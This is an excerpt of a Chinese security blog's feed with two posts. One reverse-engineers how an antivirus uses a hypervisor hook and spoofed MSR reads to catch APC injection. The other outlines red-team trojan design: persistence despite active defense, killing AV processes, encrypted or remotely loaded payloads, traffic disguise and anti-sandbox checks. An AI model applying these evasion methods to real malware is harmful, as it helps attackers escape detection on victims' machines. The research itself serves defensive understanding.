&lt;p&gt;本来文章到这里应该就结束了，但是一周之后再回头看一眼，尽管已经回答了文章开头提出的问题，但是有点虎头蛇尾，所以准备进一步研究一下。&lt;/p&gt;

&lt;p&gt;这次准备找一下杀软处理vm的模块以及相关函数，尽量看一看内部逻辑。&lt;/p&gt;

&lt;p&gt;找之前先翻了一些文档以及基于vt的hook框架，大概对vt有了一些了解。由于模块名字比较显眼，一下就看到了对应的模块。根据之前的了解，启动虚拟机需要使用VMXON指令，因此直接搜这个指令一下就可以定位到启用vmx的代码开始逆向&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210113174052058.png&quot; alt=&quot;image-20210113174052058&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210113174325354.png&quot; alt=&quot;image-20210113174325354&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210113174519268.png&quot; alt=&quot;image-20210113174519268&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这段代码为启用vmx做了一些检查，然后为每个cpu分配4KB的物理空间用于记录一些信息（vmxon需要），最后调用vmxon进行启用虚拟机，随后调用vmInit进行初始化&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210113175449339.png&quot; alt=&quot;image-20210113175449339&quot; /&gt;&lt;/p&gt;

&lt;p&gt;vmInit函数很大，一番搜寻后我找到了设置vm host入口的代码，即处理vm事件的函数VM_handler。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210113175520122.png&quot; alt=&quot;image-20210113175520122&quot; /&gt;&lt;/p&gt;

&lt;p&gt;VM_hanlder在保存现场之后，调用GetVMExitReason&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210113175706367.png&quot; alt=&quot;image-20210113175706367&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210113180222755.png&quot; alt=&quot;image-20210113180222755&quot; /&gt;&lt;/p&gt;

&lt;p&gt;函数通过vmread读取VM_EXIT_REASON，并根据不同的值调用不同的函数。当cpu使用rdmsr指令时会触发vm_exit事件，其对应的VM_EXIT_REASON为31。当VM_handler捕获到rdmsr指令时会调用SpoofMSRFunc来欺骗调用者，返回假的msr值。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210113180700346.png&quot; alt=&quot;image-20210113180700346&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看出来当读取msr的index为if中的那些值时这个函数会对其进行处理。&lt;/p&gt;

&lt;p&gt;以前总是在臆想杀软会怎么做、怎么检测，最多也就是通过杀与不杀来判断杀软的行为，真正去分析的话能对杀软有更清楚的认知。&lt;/p&gt;</content><author><name></name></author><category term="reverse-engineering" /><summary type="html">ring3下，杀软对程序无非就是各种iat hook、inline hook；在ring0由于有pg的出现，杀软厂商们不得不放弃原来使用的hook而使用微软提供的内核回调 我所知道的回调大概有这些 进程创建回调 线程创建回调 模块加载回调 注册表回调 文件监控回调 网络监控回调 这些内核回调函数对于程序行为的监控基本是很完全了，但是还不够，是有很多盲点的。聪明的黑客们也早已想到了很多办法，其中apc注入就是一种最为典型的来绕过这些内核回调监控的方法，早已被滥用于许多木马中。 既然在ring0无法使用回调的方式监控apc注入，有些杀毒软件厂商就将hook位置从内核拿到用户态。ring3下hook的好处是简单、稳定，纵使hook出现了问题也最多是程序崩溃而不会影响全局，而缺点也是显而易见的——容易被绕过、摘除 那么这是否意味着我们只要绕过了ring3下的hook，apc注入便可以成为一种难以被察觉的进程注入手段呢？答案肯定是否定的，只要对apc注入进行过测试就会知道这种方式是会被拦截的。但是杀软是如何监控到的呢？带着这个问题，我开始了探索，并写这篇文章来简要记录。 首先写一个简单的apc注入器，在安装了杀软的环境中进行注入 尽管知道不会是ring3下的hook，但是保险起见，一直跟入到syscall 没有hook 接下来我们要进入内核一探究竟，syscall是进入内核的指令，根据手册，syscall指令会从msr的lstar（0xC0000082）中读取地址作为rip 0: kd&amp;gt; rdmsr c0000082 msr[c0000082] = fffff800`0dc116c0 0: kd&amp;gt; u fffff800`0dc116c0 nt!KiSystemCall64: fffff800`0dc116c0 0f01f8 swapgs fffff800`0dc116c3 654889242510000000 mov qword ptr gs:[10h],rsp fffff800`0dc116cc 65488b2425a8010000 mov rsp,qword ptr gs:[1A8h] fffff800`0dc116d5 6a2b push 2Bh fffff800`0dc116d7 65ff342510000000 push qword ptr gs:[10h] fffff800`0dc116df 4153 push r11 fffff800`0dc116e1 6a33 push 33h fffff800`0dc116e3 51 push rcx 可以看到其中的地址指向了nt!KiSystemCall64，于是在这里下断，运行，程序并没有被断住。 到这里就卡住了，我之前从未对这里下过断点，仅仅知道这个函数大概会根据ssdt找到NtQueueApcThread对应的内核函数并调用，我也想不出任何关于调试器无法在这里下断的原因，尽管我可以静态分析来查看杀软是否对这里进行了hook，但此时我更想知道这到底是怎么一回事。 经过两天的研究事情终于有了一些眉目，在正常的情况下对nt!KiSystemCall64下断点会导致BSOD，而我这里由于杀软做了某些操作导致无事发生。nt!KiSystemCall64的前三条指令设置了gs寄存器以及内核栈，而windbg的调试实际上是依赖于windows内核的，windbg做的只不过是通过串口与内核进行交互，因此在已经进入了ring0但内核栈没有设置正确的情况下触发异常会导致蓝屏。那为什么在安装了杀软的环境中断点没有生效呢？一种情况是可能cpu根本没有运行那些指令，而是绕开了断点走了其他的地方，又或者是杀软可能对一些debug函数进行了hook阻碍了我的调试。 为了检查杀软确实没有在nt!KiSystemCall64中hook，只能静态看一下了，把这个函数的内存dump下来比较一下 PS C:\&amp;gt; diff .\av.dump .\no-av.dump InputObject SideIndicator ----------- ------------- .\no-av.dump =&amp;gt; .\av.dump &amp;lt;= 内容是一致的 从系统调用的入口没办法继续跟进，那就只能从出口入手了。 首先要检查的是ssdt中的内容是否有被更改，从ntdll!NtQueueApcThread中可以看到，他的调用号是45h 0: kd&amp;gt; u nt!KiServiceTable+(dwo(nt!KiServiceTable+(4*45))&amp;gt;&amp;gt;4) nt!NtQueueApcThread: fffff802`36a962a0 4883ec38 sub rsp,38h fffff802`36a962a4 488b442460 mov rax,qword ptr [rsp+60h] fffff802`36a962a9 4889442428 mov qword ptr [rsp+28h],rax fffff802`36a962ae 4c894c2420 mov qword ptr [rsp+20h],r9 fffff802`36a962b3 4d8bc8 mov r9,r8 fffff802`36a962b6 4c8bc2 mov r8,rdx fffff802`36a962b9 33d2 xor edx,edx fffff802`36a962bb e810000000 call nt!NtQueueApcThreadEx (fffff802`36a962d0) ssdt表是正常的，没有被修改 在nt!NtQueueApcThread下断，让程序跑起来，等待程序断下后查看调用堆栈 0: kd&amp;gt; Breakpoint 2 hit nt!NtQueueApcThread: 0010:fffff802`36a962a0 4883ec38 sub rsp,38h 0: kd&amp;gt; k # Child-SP RetAddr Call Site 00 fffffd05`75cf2918 fffff802`3a2b34db nt!NtQueueApcThread 01 fffffd05`75cf2920 ffffe60e`35f67080 0xfffff802`3a2b34db 奇怪的调用者 02 fffffd05`75cf2928 00000000`00000016 0xffffe60e`35f67080 03 fffffd05`75cf2930 fffffd05`75cf2950 0x16 04 fffffd05`75cf2938 00000202`6fdb0000 0xfffffd05`75cf2950 05 fffffd05`75cf2940 00000000`00000000 0x00000202`6fdb0000 与正常的调用作比较 0: kd&amp;gt; k # Child-SP RetAddr Call Site 00 ffff920b`14837a88 fffff800`0dc11bb5 nt!NtQueueApcThread 01 ffff920b`14837a90 00007ffe`27fac644 nt!KiSystemServiceCopyEnd+0x25 02 000000e6`96cff598 00007ffe`258a137f ntdll!NtQueueApcThread+0x14 03 000000e6`96cff5a0 00007ff6`5f1d95d8 KERNELBASE!QueueUserAPC+0x8f 04 000000e6`96cff600 00000000`00000000 xxxx!inject+0x4d8 可以看到杀软对我们的hook 分析这个hook函数 0010:fffff802`3a2b3428 4c8bdc mov r11, rsp ;函数起始位置，栈指针存入r11 0010:fffff802`3a2b342b 49895b08 mov qword ptr [r11+8], rbx ; 存rbx 0010:fffff802`3a2b342f 49897310 mov qword ptr [r11+10h], rsi; 存rsi 0010:fffff802`3a2b3433 57 push rdi 0010:fffff802`3a2b3434 4881ec60010000 sub rsp, 160h 0010:fffff802`3a2b343b 488b842490010000 mov rax, qword ptr [rsp+190h] 0010:fffff802`3a2b3443 48894c2430 mov qword ptr [rsp+30h], rcx 0010:fffff802`3a2b3448 0fb70dbd540600 movzx ecx, word ptr [fffff802`3a31890c] 0010:fffff802`3a2b344f 4889442450 mov qword ptr [rsp+50h], rax 0010:fffff802`3a2b3454 498d4328 lea rax, [r11+28h] 0010:fffff802`3a2b3458 4c89442440 mov qword ptr [rsp+40h], r8 0010:fffff802`3a2b345d 4889442428 mov qword ptr [rsp+28h], rax 0010:fffff802`3a2b3462 4c894c2448 mov qword ptr [rsp+48h], r9 0010:fffff802`3a2b3467 488d442460 lea rax, [rsp+60h] 0010:fffff802`3a2b346c 4889542438 mov qword ptr [rsp+38h], rdx 0010:fffff802`3a2b3471 4d8d8b78ffffff lea r9, [r11-88h] 0010:fffff802`3a2b3478 4c8d442430 lea r8, [rsp+30h] 0010:fffff802`3a2b347d ba16000000 mov edx, 16h 0010:fffff802`3a2b3482 4889442420 mov qword ptr [rsp+20h], rax 0010:fffff802`3a2b3487 e87852ffff call fffff802`3a2a8704 0010:fffff802`3a2b348c 8bd8 mov ebx, eax 0010:fffff802`3a2b348e 3d030500c0 cmp eax, 0C0000503h 0010:fffff802`3a2b3493 7504 jne fffff802`3a2b3499 0010:fffff802`3a2b3495 33db xor ebx, ebx 0010:fffff802`3a2b3497 eb45 jmp fffff802`3a2b34de 0010:fffff802`3a2b3499 85c0 test eax, eax 0010:fffff802`3a2b349b 7841 js fffff802`3a2b34de 0010:fffff802`3a2b349d 488b157c550600 mov rdx, qword ptr [fffff802`3a318a20] ;rdx指向nt!KeServiceDescriptorTable 0010:fffff802`3a2b34a4 0fb70d61540600 movzx ecx, word ptr [fffff802`3a31890c] ;调用号 0010:fffff802`3a2b34ab 4c8b4c2448 mov r9, qword ptr [rsp+48h] 0010:fffff802`3a2b34b0 488b02 mov rax, qword ptr [rdx] ;rax指向了ssdt 0010:fffff802`3a2b34b3 4c8b442440 mov r8, qword ptr [rsp+40h] 0010:fffff802`3a2b34b8 488b542438 mov rdx, qword ptr [rsp+38h] 0010:fffff802`3a2b34bd 8b0c88 mov ecx, dword ptr [rax+rcx*4];根据调用号与ssdt基地址获取了内核函数的偏移 0010:fffff802`3a2b34c0 c1f904 sar ecx, 4 ;右移4位 0010:fffff802`3a2b34c3 4c63d1 movsxd r10, ecx 0010:fffff802`3a2b34c6 488b4c2430 mov rcx, qword ptr [rsp+30h] 0010:fffff802`3a2b34cb 4c03d0 add r10, rax ;计算出目标函数地址 0010:fffff802`3a2b34ce 488b442450 mov rax, qword ptr [rsp+50h] 0010:fffff802`3a2b34d3 4889442420 mov qword ptr [rsp+20h], rax 0010:fffff802`3a2b34d8 41ffd2 call r10 ;调用目标函数 0010:fffff802`3a2b34db 488bd8 mov rbx, rax 0010:fffff802`3a2b34de 4863bc2490010000 movsxd rdi, dword ptr [rsp+190h] 0010:fffff802`3a2b34e6 85ff test edi, edi 0010:fffff802`3a2b34e8 743a je fffff802`3a2b3524 0010:fffff802`3a2b34ea 488d34fdf8ffffff lea rsi, [rdi*8-8] 0010:fffff802`3a2b34f2 4c8b4c3460 mov r9, qword ptr [rsp+rsi+60h] 0010:fffff802`3a2b34f7 488d542430 lea rdx, [rsp+30h] 0010:fffff802`3a2b34fc 4c63c3 movsxd r8, ebx 0010:fffff802`3a2b34ff b916000000 mov ecx, 16h 0010:fffff802`3a2b3504 ff9434e0000000 call qword ptr [rsp+rsi+0E0h] 0010:fffff802`3a2b350b 3d030500c0 cmp eax, 0C0000503h 0010:fffff802`3a2b3510 7504 jne fffff802`3a2b3516 0010:fffff802`3a2b3512 33db xor ebx, ebx 0010:fffff802`3a2b3514 eb05 jmp fffff802`3a2b351b 0010:fffff802`3a2b3516 85c0 test eax, eax 0010:fffff802`3a2b3518 0f48d8 cmovs ebx, eax 0010:fffff802`3a2b351b 4883ee08 sub rsi, 8 0010:fffff802`3a2b351f 83c7ff add edi, 0FFFFFFFFh 0010:fffff802`3a2b3522 75ce jne fffff802`3a2b34f2 0010:fffff802`3a2b3524 4c8d9c2460010000 lea r11, [rsp+160h]; 清栈 0010:fffff802`3a2b352c 8bc3 mov eax, ebx 0010:fffff802`3a2b352e 498b5b10 mov rbx, qword ptr [r11+10h] 0010:fffff802`3a2b3532 498b7318 mov rsi, qword ptr [r11+18h] 0010:fffff802`3a2b3536 498be3 mov rsp, r11 0010:fffff802`3a2b3539 5f pop rdi ;rsp现在指向 nt!KiSystemServiceCopyEnd + 0x25 0010:fffff802`3a2b353a c3 ret 可以看出它同样实现了KiSystemCall64的功能做了查找ssdt的工作 这段函数不属于任意一个模块，而根据最后函数最后ret的地址指向 nt!KiSystemServiceCopyEnd + 0x25，这似乎意味着这个hook函数是正常从nt!KiSystemServiceCopyEnd调用过来的。但是正常情况来讲nt!KiSystemServiceCopyEnd会从原有的ssdt中取值计算出用户态syscall对应的内核函数，如果这个hook函数是由KiSystemServiceCopyEnd调用的，这也就代表杀软修改了ssdt，这就出现了矛盾。因此我猜测这个返回地址是伪造出来的，可以用这样几种方式实现 push nt!KiSystemServiceCopyEnd + 0x25 jmp hook_func_addr_offset push nt!KiSystemServiceCopyEnd + 0x25 mov rax,hook_func_addr jmp rax push nt!KiSystemServiceCopyEnd + 0x25 push hook_func_addr_offset ret 用这样的代码来调用它，我们可以伪造出调用方，防止逆向人员的逆向 尝试在nt!KiSystemServiceCopyEnd设置断点，很幸运，与在KiSystemCall64设置断点不同，在这里断点可以生效。 1: kd&amp;gt; u nt!KiSystemServiceCopyEnd nt!KiSystemServiceCopyEnd: fffff802`3681eb90 f705665a8f0001000000 test dword ptr [nt!KiDynamicTraceMask (fffff802`37114600)],1 fffff802`3681eb9a 0f8593040000 jne nt!KiSystemServiceExitPico+0x1fe (fffff802`3681f033) fffff802`3681eba0 f705de588f0040000000 test dword ptr [nt!PerfGlobalGroupMask+0x8 (fffff802`37114488)],40h fffff802`3681ebaa 0f85f7040000 jne nt!KiSystemServiceExitPico+0x272 (fffff802`3681f0a7) fffff802`3681ebb0 498bc2 mov rax,r10 fffff802`3681ebb3 ffd0 call rax fffff802`3681ebb5 0f1f00 nop dword ptr [rax] fffff802`3681ebb8 65ff0425b82e0000 inc dword ptr gs:[2EB8h] 1: kd&amp;gt; r r10 r10=fffff8023a2b3428 之后的代码会调用r10中指向的函数，而r10的地址正是之前分析的hook函数的地址，看来hook函数的调用这就是nt!KiSystemServiceCopyEnd + 0x25，而并非是伪造出的。 那么这个r10中的地址是怎样得到的呢，从nt!KiSystemServiceCopyEnd往上翻，我们可以找到r10的来源 1: kd&amp;gt; u nt!KiSystemServiceRepeat nt!KiSystemServiceGdiTebAccess nt!KiSystemServiceRepeat: fffff802`3681ea34 4c8d1585ae9f00 lea r10,[nt!KeServiceDescriptorTable (fffff802`372198c0)] fffff802`3681ea3b 4c8d1dfe5f8f00 lea r11,[nt!KeServiceDescriptorTableShadow (fffff802`37114a40)] fffff802`3681ea42 f7437880000000 test dword ptr [rbx+78h],80h fffff802`3681ea49 7413 je nt!KiSystemServiceRepeat+0x2a (fffff802`3681ea5e) fffff802`3681ea4b f7437800002000 test dword ptr [rbx+78h],200000h fffff802`3681ea52 7407 je nt!KiSystemServiceRepeat+0x27 (fffff802`3681ea5b) fffff802`3681ea54 4c8d1d65618f00 lea r11,[nt!KeServiceDescriptorTableFilter (fffff802`37114bc0)] fffff802`3681ea5b 4d8bd3 mov r10,r11 fffff802`3681ea5e 413b443a10 cmp eax,dword ptr [r10+rdi+10h] fffff802`3681ea63 0f832c050000 jae nt!KiSystemServiceExitPico+0x160 (fffff802`3681ef95) fffff802`3681ea69 4d8b143a mov r10,qword ptr [r10+rdi] fffff802`3681ea6d 4d631c82 movsxd r11,dword ptr [r10+rax*4] fffff802`3681ea71 498bc3 mov rax,r11 fffff802`3681ea74 49c1fb04 sar r11,4 fffff802`3681ea78 4d03d3 add r10,r11 fffff802`3681ea7b 83ff20 cmp edi,20h fffff802`3681ea7e 7550 jne nt!KiSystemServiceGdiTebAccess+0x49 (fffff802`3681ead0) fffff802`3681ea80 4c8b9bf0000000 mov r11,qword ptr [rbx+0F0h] nt!KiSystemServiceGdiTebAccess: fffff802`3681ea87 4183bb4017000000 cmp dword ptr [r11+1740h],0 从代码中可以看出，r10应该是解析了ssdt表后所指向的内核函数，而从我们调试得到的结果来看，r10指向的并非是应该指向的函数，并且ssdt表也没有被修改。 继续在nt!KiSystemServiceRepeat这里下断点，发现情况与之前在KiSystemCall64下断的情况一下，断点并未生效。 经过一番摸索后发现，在nt!KiSystemServiceRepeat+0x47之后的地方下断都可以生效，而在其之前都无法生效 1: kd&amp;gt; u nt!KiSystemServiceRepeat+0x47 nt!KiSystemServiceRepeat+0x47: fffff802`3681ea7b 83ff20 cmp edi,20h fffff802`3681ea7e 7550 jne nt!KiSystemServiceGdiTebAccess+0x49 (fffff802`3681ead0) fffff802`3681ea80 4c8b9bf0000000 mov r11,qword ptr [rbx+0F0h] ..... 断在这里的时候r10已经指向hook函数 1: kd&amp;gt; g Breakpoint 6 hit nt!KiSystemServiceRepeat+0x47: 0010:fffff802`3681ea7b 83ff20 cmp edi,20h 1: kd&amp;gt; r r10 r10=fffff8023a2b3428 确实有点不知道如何是好了，看起来在执行syscall之后，cpu并没有来到nt!KiSystemCall64，而是走了另外的代码，最终又跳转回来。 有想过把附近4gb的内存全部dump下来用ida分析看看是哪里跳过来的，但是仔细一想根本不可行，4gb内存不知道要分析多长时间，而且这4gb内存必然是不连续的，在dump过程中会访问到不可读的内存导致出错。 又折腾了两三天，在查阅资料的过程中我了解到了这是一种基于vmm的hook，他修改了msr中的值，让cpu在执行syscall时跳转到它的hook函数，而当其他人读取msr寄存器中的值时会返回一个伪造的值让msr看起来并没有被修改。但是如何证明杀软确实是这么做的呢？qemu理论应该可以跟踪cpu的执行流程在执行syscall后跳到了hook函数的地址，或者直接获取msr寄存器中真实的值（纯软件模拟应该可以，但是现在qemu并非纯软件模拟了）。最后感觉自己这方面知识太少还不足以去调试vt，只好弄了个最简单的方法：在关掉了虚拟化后，在KiSystemCall64下断可以生效。这大概也算是证明了吧。 基于vmm，不但可以修改msr不被发现，甚至连内存也可以伪造出来，有点想到黑客帝国了。 本来文章到这里应该就结束了，但是一周之后再回头看一眼，尽管已经回答了文章开头提出的问题，但是有点虎头蛇尾，所以准备进一步研究一下。 这次准备找一下杀软处理vm的模块以及相关函数，尽量看一看内部逻辑。 找之前先翻了一些文档以及基于vt的hook框架，大概对vt有了一些了解。由于模块名字比较显眼，一下就看到了对应的模块。根据之前的了解，启动虚拟机需要使用VMXON指令，因此直接搜这个指令一下就可以定位到启用vmx的代码开始逆向 这段代码为启用vmx做了一些检查，然后为每个cpu分配4KB的物理空间用于记录一些信息（vmxon需要），最后调用vmxon进行启用虚拟机，随后调用vmInit进行初始化 vmInit函数很大，一番搜寻后我找到了设置vm host入口的代码，即处理vm事件的函数VM_handler。 VM_hanlder在保存现场之后，调用GetVMExitReason 函数通过vmread读取VM_EXIT_REASON，并根据不同的值调用不同的函数。当cpu使用rdmsr指令时会触发vm_exit事件，其对应的VM_EXIT_REASON为31。当VM_handler捕获到rdmsr指令时会调用SpoofMSRFunc来欺骗调用者，返回假的msr值。 可以看出来当读取msr的index为if中的那些值时这个函数会对其进行处理。 以前总是在臆想杀软会怎么做、怎么检测，最多也就是通过杀与不杀来判断杀软的行为，真正去分析的话能对杀软有更清楚的认知。</summary></entry><entry><title type="html">木马杂谈</title><link href="https://citrusice.github.io/posts/something-ablout-malware/" rel="alternate" type="text/html" title="木马杂谈" /><published>2021-01-02T18:03:45+08:00</published><updated>2021-01-02T18:03:45+08:00</updated><id>https://citrusice.github.io/posts/something-ablout-malware</id><content type="html" xml:base="https://citrusice.github.io/posts/something-ablout-malware/">&lt;p&gt;在红队的这几个月里见识了很多，有不少的收获。如果说做红队跟渗透测试有什么不一样，有一点就是红队会运用到很多针对个人终端的攻击手法。在这其中，木马扮演了十分关键的角色。&lt;/p&gt;

&lt;p&gt;写一点我的想法以及研究方向，不涉及具体实现。&lt;/p&gt;

&lt;h2 id=&quot;命令与控制&quot;&gt;命令与控制&lt;/h2&gt;
&lt;p&gt;木马的基本功能，即攻击者拥有控制木马行为的能力。唯一可以一提的是攻击者操纵木马的自由度，例如cs提供了object file的功能，相当于让攻击者拥有了在木马进程内执行任意代码的能力。&lt;/p&gt;

&lt;h2 id=&quot;bypass主动防御权限维持&quot;&gt;bypass主动防御、权限维持&lt;/h2&gt;
&lt;p&gt;在有了控制目标终端的能力之后，最重要的事情就是维持住这个权限，这一块难点主要就是在目标机器上有一些杀软的情况下去做权限维持。经过一些摸索和测试发现，对杀软来说，任何对系统关键位置进行修改的敏感操作都需要在可信的进程下去进行，否则会对这个行为进行拦截（对用户进行提示，默认拒绝）。可信的进程不单是文件需要有签名，同时需要这个进程向上的进程链上所有的进程都要有签名。&lt;/p&gt;

&lt;p&gt;研究绕过主动防御进行权限维持的方向有&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;修改一些系统非关键位置来实现一些非常规的权限维持，比如针对一些系统上已有的自启动服务寻找dll劫持的漏洞&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;将敏感操作放到可信进程中去进行，可以利用已有的进程，也可以自己构造一个可信的进程，当然还可以直接给自己的马整个签名&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;关掉主动防御，看起来在r3层与r0层对抗是不可能的，但对于一些自保没做好的杀软依然可以做到直接干掉杀毒软件的进程&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;fully-undetectable---木马的伪装与特征隐藏&quot;&gt;Fully UnDetectable - 木马的伪装与特征隐藏&lt;/h2&gt;
&lt;p&gt;一个程序打开不展示任何窗口，没有任何输出，那是个人都会觉得不对劲。而对于杀软来说，一个不创建任何窗口的Win32程序也同样是值得警惕的。因此，给木马捆绑一个正常的程序，既可以让对方放下警戒，也在一定程度上能达到免杀的效果。&lt;/p&gt;

&lt;p&gt;大部分红队都是直接使用现成的马，比如cs，然后配合一个loader用于免杀，有些也会在别人开源项目的基础上定制自己的木马。而就算是纯自研的木马，在开发时如果没有考虑到如何快速变异，时间长了也免不了被分析、提取特征。因此对于这种就总会涉及到基于特征的各种查杀。&lt;/p&gt;

&lt;p&gt;大体上有三种特征，流量特征、文件特征、内存特征&lt;/p&gt;

&lt;p&gt;如何规避查杀？&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;对于流量特征，例如cs提供了malleable C2的功能允许使用者将木马的流量伪装成正常的流量，配合https以及域前置就可以达到非常的好的效果。&lt;/li&gt;
  &lt;li&gt;对于文件特征，常用的手段有将shellcode、原始pe进行加密存储，或者当木马运行的时候才将真正的部分从远程加载过来以躲避杀毒软件的静态查杀，核心思想是将真正有特征的部分进行加密或与文件分离存放。&lt;/li&gt;
  &lt;li&gt;但是上面这些隐藏文件特征的手法对于内存查杀来说都没有意义，加密或者从远端获取的payload最终总会在内存里完全的暴露出来，甚至已经有蓝队开发出了针对cs的内存扫描工具，可以将beacon中的配置完全提取。怎么解决？使用自研/魔改的木马可以轻松躲避所有特征的查杀（废话），而对于使用cs这种并不开源的马的红队来讲，尽管cs提供了一些解决方案，但并不是无死角的，这就是一个很大的问题。
通用的隐藏内存中特征的解决方案是我最近在研究的项目。我把木马内存中的特征分为两类，代码段中的特征与数据段中的特征。对于代码段中的特征，可以使用一些保护商业软件防止被破解的思路，加一些代码混淆、膨胀甚至vm壳，改变了代码段的内容后特征自然就消失了。但是很不幸，大部分的特征实际上都是针对木马的数据段来提取的，因此需要想办法来保护数据段。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;除此之外，为了更好的应对特征查杀，木马应具有变异的能力。&lt;/p&gt;

&lt;h2 id=&quot;anti-analysis&quot;&gt;anti analysis&lt;/h2&gt;
&lt;p&gt;主要是就是反沙盒和反人工分析&lt;/p&gt;

&lt;p&gt;反沙盒比较重要，我认为基本决定了马能活多长时间，而反人工往往只是为了给分析增加难度（当马已经进入人工分析的阶段那说明这马已经被发现有问题了）。沙盒大概可以分为两种，模拟执行pe的沙盒和完全拟真的虚拟机。前者比如火绒，当用户运行程序前它会将目标程序在它自己的沙盒里跑一遍，没有问题再放行，这种的绕过比较简单，而对于完全拟真的环境就需要去判断。&lt;/p&gt;

&lt;p&gt;我们不能单纯的通过判断当前程序是否运行在虚拟环境中来决定是否执行恶意代码，这会造成使用云桌面、或者是一些使用虚拟化服务器的目标没法上线。比较可行的做法是尽可能小心的收集目标系统上的信息（小心是因为获取部分信息的时候会被沙箱标记上虚拟机检测行为），然后对这些信息进行打分，或者由人工来判断是否继续执行恶意代码。&lt;/p&gt;

&lt;p&gt;为了防止这种完全拟真的环境，有时我们还可以使用基于白名单的做法，即目标中具有xx特征时才真正执行恶意代码，比如目标必须已安装xx软件，上线ip必须处于某个ip段，甚至绑定目标机器的木马，当然这些都需要与其他手段配合使用。&lt;/p&gt;

&lt;p&gt;值得一提的还有很多沙盒与edr对程序的监控。因为内核回调对程序行为的把控有限，它们的监控多是使用r3层的hook，这也就意味着我们可以通过多种方式绕过这种监控，能够起到很好的效果。&lt;/p&gt;

&lt;p&gt;反人工分析意义不是很大，方式也无外乎各种反调试。如果非要做的话，我认为应该把隐藏ioc作为反人工的目标，而不是尽可能的阻碍调试。&lt;/p&gt;

&lt;h2 id=&quot;从木马到rootkit&quot;&gt;从木马到rootkit&lt;/h2&gt;
&lt;p&gt;虽然说木马的功能完全可以都在r3去做，但是我还是想进r0看看&lt;/p&gt;

&lt;h2 id=&quot;关于语言选择&quot;&gt;关于语言选择&lt;/h2&gt;
&lt;p&gt;语言选择需要根据当前红队的开发能力来做，目前比较流行的有python、c#、c/c++，还有最近很火的nim。对于木马开发来讲，我比较倾向于c/c++。python与c#最大的问题是依赖，python打包后体积太大不利于传输或捆绑。c#得益于大部分系统都已经安装了.net，在体积上没有那么劣势，但是.net版本难以协调。有些lib不兼容.net2.0，而有些lib太老早已不维护。并且4.0比2.0多太多新的东西，要想写出兼容性好的代就要放弃这些特性，这又与“便捷”走远了。之前用过一段c#做木马开发，一个组件要维护两个版本，感觉很麻烦，因此我个人不是很喜欢用c#。nim这个语言很好，他实际上是一个代码转译器，将nim代码转为其他代码再通过编译器去编译，它是一个更好的c，因此不存在依赖问题，同时又兼顾了开发的便捷性。我不选择nim其实很大一部分原因是因为我并不熟悉它，不知道它会有怎样的坑，而我在c/c++的领域已经有了一些积累，有很多可以复用的代码让我的开发速度不亚于使用其他语言。另一部分原因是因为c++的模板，它可以做的事情太多了，暂时还没有看到nim里有更好的方式来替代它。c/c++的好处是我可以去干任何事，并且c/c++的代码库很丰富，不管什么功能都可以找到对应的实现。坏处是开发者必须要去干任何事，同时它太底层了，少了很多高级语言的特性，尽管模版可以弥补，但是这就带来了一定的门槛。&lt;/p&gt;

&lt;h2 id=&quot;其他&quot;&gt;其他&lt;/h2&gt;
&lt;p&gt;两个月前写的文章，因为忙于其他事一直没有写完，这两天修修补补总算是差不多了。做这个方向感觉没什么人可以交流，大部分选手所谓的免杀都仅仅停留在使用不同的loader加载shellcode做个文件免杀，没啥意思。不过木马作为终端攻防的重点，一定会随着需求的增加有所发展，相信之后深入研究这些的人会越来越多。&lt;/p&gt;</content><author><name></name></author><category term="develop" /><summary type="html">在红队的这几个月里见识了很多，有不少的收获。如果说做红队跟渗透测试有什么不一样，有一点就是红队会运用到很多针对个人终端的攻击手法。在这其中，木马扮演了十分关键的角色。 写一点我的想法以及研究方向，不涉及具体实现。 命令与控制 木马的基本功能，即攻击者拥有控制木马行为的能力。唯一可以一提的是攻击者操纵木马的自由度，例如cs提供了object file的功能，相当于让攻击者拥有了在木马进程内执行任意代码的能力。 bypass主动防御、权限维持 在有了控制目标终端的能力之后，最重要的事情就是维持住这个权限，这一块难点主要就是在目标机器上有一些杀软的情况下去做权限维持。经过一些摸索和测试发现，对杀软来说，任何对系统关键位置进行修改的敏感操作都需要在可信的进程下去进行，否则会对这个行为进行拦截（对用户进行提示，默认拒绝）。可信的进程不单是文件需要有签名，同时需要这个进程向上的进程链上所有的进程都要有签名。 研究绕过主动防御进行权限维持的方向有 修改一些系统非关键位置来实现一些非常规的权限维持，比如针对一些系统上已有的自启动服务寻找dll劫持的漏洞 将敏感操作放到可信进程中去进行，可以利用已有的进程，也可以自己构造一个可信的进程，当然还可以直接给自己的马整个签名 关掉主动防御，看起来在r3层与r0层对抗是不可能的，但对于一些自保没做好的杀软依然可以做到直接干掉杀毒软件的进程 Fully UnDetectable - 木马的伪装与特征隐藏 一个程序打开不展示任何窗口，没有任何输出，那是个人都会觉得不对劲。而对于杀软来说，一个不创建任何窗口的Win32程序也同样是值得警惕的。因此，给木马捆绑一个正常的程序，既可以让对方放下警戒，也在一定程度上能达到免杀的效果。 